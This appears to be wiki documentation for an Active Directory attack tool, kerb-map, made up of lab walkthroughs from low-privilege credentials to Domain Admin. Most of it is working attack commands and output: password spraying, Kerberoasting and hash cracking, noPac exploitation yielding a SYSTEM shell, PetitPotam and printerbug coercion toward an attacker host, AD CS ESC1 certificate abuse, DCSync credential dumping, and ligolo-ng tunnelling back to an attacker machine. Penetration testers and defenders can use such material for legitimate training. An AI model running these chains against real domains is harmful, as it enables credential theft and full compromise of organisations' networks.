# Real Lab Examples

> End-to-end walkthroughs showing kerb-map in real AD lab environments. Each example covers initial access, kerb-map output interpretation, exploitation, and the path to Domain Admin.

---

## Lab 1 — Kerberoast to Domain Admin (Classic Path)

**Environment:**
```
Domain:      corp.local
DC:          192.168.1.10 (DC01)
Users:       helpdesk01 (low-priv, password: Welcome2024!)
             svc_sql (service account, Kerberoastable, admin group member)
```

### Step 1 — Initial Credentials

Password spray found `helpdesk01:Welcome2024!` via kerbrute.

### Step 2 — Run kerb-map

```bash
kerb-map -d corp.local -dc 192.168.1.10 -u helpdesk01 -p 'Welcome2024!' --all
```

**kerb-map output:**

```
Domain Overview
  Domain:              corp.local
  Functional Level:    Windows Server 2016/2019/2022
  Machine Acct Quota:  10
  Min Pwd Length:      7
  Lockout Threshold:   0   ← (no lockout — spray freely)

Kerberoastable Accounts
  Account    SPN Types  Pwd Age  RC4   Admin  Score
  svc_sql    MSSQLSvc   412d     YES   YES    85
  svc_web    HTTP       30d      NO    NO     20

Priority Attack Paths
  #1  svc_sql    Kerberoast   CRITICAL  85   RC4 allowed | pwd 412d old | ADMIN GROUP
      → GetUserSPNs.py corp.local/helpdesk01:Welcome2024! -request-user svc_sql
```

### Step 3 — Kerberoast svc_sql

```bash
GetUserSPNs.py corp.local/helpdesk01:'Welcome2024!' \
    -request-user svc_sql \
    -outputfile svc_sql.hash
```

Output:
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$a3b2...
```

### Step 4 — Crack the Hash

```bash
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt

# Cracked in 4 minutes:
# svc_sql:SqlPassword1!
```

### Step 5 — Re-run kerb-map With Elevated Creds

```bash
kerb-map -d corp.local -dc 192.168.1.10 -u svc_sql -p 'SqlPassword1!' --all --cves
```

svc_sql is a member of Domain Admins. Direct DCSync:

```bash
secretsdump.py corp.local/svc_sql:'SqlPassword1!'@192.168.1.10 -just-dc

# Output:
# Administrator:500:aad3...:8f538...:::
# krbtgt:502:aad3...:a4b5c...:::
# [all domain hashes]
```

**Domain compromised. Time: 18 minutes from initial spray.**

---

## Lab 2 — noPac (Any User to DA)

**Environment:**
```
Domain:      PSIS.LOCAL
DC:          10.10.10.5
Credentials: any.user:Password1 (standard domain user)
MachineAccountQuota: 10 (default)
Patches:     Missing KB5008380
```

### Step 1 — kerb-map Identifies noPac

```bash
kerb-map -d PSIS.LOCAL -dc 10.10.10.5 -u any.user -p Password1 --cves
```

**CVE output:**
```
CVE / Misconfiguration Checks
CVE              Name                         Sev       Vuln   Detail
CVE-2021-42278   noPac / sAMAccountName Spoof CRITICAL  YES    MachineAccountQuota=10, schema v87
```

**Priority table — top entry:**
```
#1  Domain Controller  noPac (CVE-2021-42278/42287)  CRITICAL  98
    → python noPac.py PSIS.LOCAL/any.user:Password1 -dc-ip 10.10.10.5 -shell
```

### Step 2 — Exploit noPac

```bash
python noPac.py PSIS.LOCAL/any.user:Password1 \
    -dc-ip 10.10.10.5 \
    -shell
```

Output:
```
[+] Got TGT with PAC
[+] sAMAccountName altered successfully
[+] Got TGT with extra PAC
[+] Got service ticket
[*] Launching semi-interactive shell
# whoami
nt authority\system
# hostname
DC01
```

### Step 3 — DCSync

```bash
secretsdump.py -k -no-pass PSIS.LOCAL/administrator@DC01.PSIS.LOCAL

# Or via noPac directly
python noPac.py PSIS.LOCAL/any.user:Password1 \
    -dc-ip 10.10.10.5 \
    --impersonate administrator \
    -dump
```

**Domain compromised from a standard user. Time: 4 minutes.**

---

## Lab 3 — Unconstrained Delegation + PetitPotam → DCSync

**Environment:**
```
Domain:      JJK.local
DC:          192.168.10.5 (DC01)
App server:  192.168.10.20 (APPSERVER01 — unconstrained delegation)
Credentials: low.priv:Password123
Attacker:    192.168.10.99
```

### Step 1 — kerb-map Finds Unconstrained Delegation

```bash
kerb-map -d JJK.local -dc 192.168.10.5 -u low.priv -p Password123 \
    --delegation --cves --aggressive
```

**Output:**
```
Unconstrained Delegation (1 host):
  APPSERVER01$  [computer]  appserver01.jjk.local

CVE / Misconfiguration Checks
CVE-2021-36942  PetitPotam  HIGH  YES  EFSRPC pipe reachable on DC

Priority Attack Paths
  #1  APPSERVER01$  Unconstrained Delegation → TGT Capture  CRITICAL  95
      → python printerbug.py JJK.local/user:pass@APPSERVER01.jjk.local <ATTACKER_IP>
```

### Step 2 — Compromise APPSERVER01

*(Low.priv has local admin on APPSERVER01 — identified via nxc)*

```bash
nxc smb 192.168.10.20 -u low.priv -p Password123
# [+] JJK.local\low.priv:Password123 (Pwn3d!)

evil-winrm -i 192.168.10.20 -u low.priv -p Password123
```

### Step 3 — Start TGT Monitor on APPSERVER01

```powershell
# On APPSERVER01 via evil-winrm
.\Rubeus.exe monitor /interval:5 /nowrap
```

### Step 4 — Coerce DC Authentication via PetitPotam

```bash
# From attacker machine
python PetitPotam.py 192.168.10.99 192.168.10.5
```

### Step 5 — DC's TGT Arrives on APPSERVER01

```
[*] 15/03/2024 14:23:11 UTC - Found new TGT!

  User                  :  DC01$@JJK.LOCAL
  StartTime             :  15/03/2024 14:23:11
  EndTime               :  15/03/2024 00:23:11
  RenewTill             :  22/03/2024 14:23:11
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :
    doIGKDCCBiSgAwIBBaED...
```

### Step 6 — Import Ticket and DCSync

```bash
# Convert base64 ticket to ccache
echo "doIGKD..." | base64 -d > dc01.kirbi
python ticketConverter.py dc01.kirbi dc01.ccache

export KRB5CCNAME=/tmp/dc01.ccache

# DCSync
secretsdump.py -k -no-pass JJK.local/DC01$@DC01.JJK.LOCAL

# Administrator NTLM: 8f538...
```

**Domain compromised via delegation + coercion chain. Time: 22 minutes.**

---

## Lab 4 — AD CS ESC1 Attack

**Environment:**
```
Domain:      soupedecode.local
CA:          CORP-CA on ADCS.soupedecode.local
Vulnerable template: UserCert (ENROLLEE_SUPPLIES_SUBJECT, Client Auth EKU)
Credentials: s.smith:Password1
```

### Step 1 — kerb-map Finds ESC1

```bash
kerb-map -d soupedecode.local -dc 192.168.50.10 \
    -u s.smith -p Password1 --cves
```

**CVE output:**
```
ESC1-ESC8  AD CS Misconfigurations  CRITICAL  YES
  Found 1 misconfigured template across 1 CA

Vulnerable templates:
  UserCert — ESC1 — ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU
  → Any enrollee can request cert as any user (incl Domain Admin)

Next step:
  certipy find -u s.smith@soupedecode.local -p Password1 -dc-ip 192.168.50.10 -vulnerable
  certipy req -u s.smith@soupedecode.local -p Password1 -ca CORP-CA -template UserCert -upn administrator@soupedecode.local
```

### Step 2 — Run Certipy for Full Detail

```bash
certipy find -u s.smith@soupedecode.local -p Password1 \
    -dc-ip 192.168.50.10 -vulnerable

# Confirms: UserCert template, ESC1, enrollment rights for Domain Users
```

### Step 3 — Request Certificate as Administrator

```bash
certipy req -u s.smith@soupedecode.local -p Password1 \
    -ca CORP-CA \
    -template UserCert \
    -upn administrator@soupedecode.local \
    -dc-ip 192.168.50.10

# Output: Saved certificate and private key to 'administrator.pfx'
```

### Step 4 — Authenticate and Get NTLM Hash

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.50.10

# Output:
# [*] Got hash for 'administrator@soupedecode.local': aad3...:8f538...
```

### Step 5 — Pass the Hash → DCSync

```bash
secretsdump.py soupedecode.local/administrator@192.168.50.10 \
    -hashes aad3...:8f538...

# All domain hashes dumped
```

**Domain compromised via AD CS ESC1. Time: 8 minutes after initial access.**

---

## Lab 5 — Multi-Hop via Pivoting with Ligolo-ng

**Environment:**
```
Attacker:          10.0.0.5 (Kali)
DMZ network:       192.168.1.0/24 (reachable from attacker)
  WEBSERVER:       192.168.1.50 (compromised via web exploit)
Internal network:  10.10.10.0/24 (NOT reachable from attacker)
  DC:              10.10.10.5
  CA:              10.10.10.15
```

### Step 1 — Set Up Ligolo-ng Tunnel

```bash
# Attacker: start proxy
./proxy -selfcert

# On WEBSERVER (compromised, upload agent):
./agent -connect 10.0.0.5:11601 -ignore-cert
```

In ligolo console:
```
>> session
>> [select WEBSERVER session]
>> ifconfig
# Shows: 10.10.10.0/24 interface
>> tunnel_start --tun ligolo
```

```bash
# Add route on attacker
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Step 2 — Run kerb-map Through the Tunnel

```bash
# Now the internal DC is reachable directly
kerb-map -d internal.corp.local -dc 10.10.10.5 \
    -u domain_user -p Password123 \
    --all --cves

# kerb-map enumerates the internal domain from attacker Kali machine
# as if directly connected to 10.10.10.0/24
```

### Step 3 — Follow kerb-map Output to Compromise

Same as previous labs — follow the priority table. The tunnel is transparent to impacket and kerb-map.

---

## Common Patterns and Shortcuts

After running kerb-map across dozens of environments, these patterns appear most frequently:

### Pattern 1 — Service Accounts With Old Passwords

The most common finding. Service accounts are often provisioned once and never rotated. A 3+ year old password on an RC4-enabled MSSQLSvc account cracks in minutes.

```bash
# kerb-map score ≥ 75 with RC4 = attempt immediately
GetUserSPNs.py ... -request-user <account> | hashcat -m 13100
```

### Pattern 2 — Default MachineAccountQuota

`ms-DS-MachineAccountQuota = 10` is the AD default. Many organisations never change it. This alone enables noPac if the patches aren't applied.

```bash
# kerb-map noPac check — if vulnerable, this is your fastest path to DA
python noPac.py ... -shell
```

### Pattern 3 — Print Spooler on DCs

Despite years of advisories, print spoolers frequently remain enabled on DCs. This is an immediate forced-authentication primitive.

```bash
# kerb-map --aggressive finds it
# Pair with unconstrained delegation host for TGT capture
python printerbug.py <domain>/<user>:<pass>@<DC> <UNCONSTRAINED_HOST>
```

### Pattern 4 — AD CS With Default Templates

Active Directory Certificate Services is deployed in many enterprises and left largely unconfigured. The `User` template with `ENROLLEE_SUPPLIES_SUBJECT` is a common finding that directly yields DA.

```bash
# kerb-map --cves catches ESC1-ESC4
# certipy req immediately follows
```

---

## See Also

- [AD Pentest Methodology](AD-Pentest-Methodology) — full methodology context
- [CVE Detection](CVE-Detection) — exploitation details for each CVE
- [Detection & Evasion](Detection-and-Evasion) — operating quietly
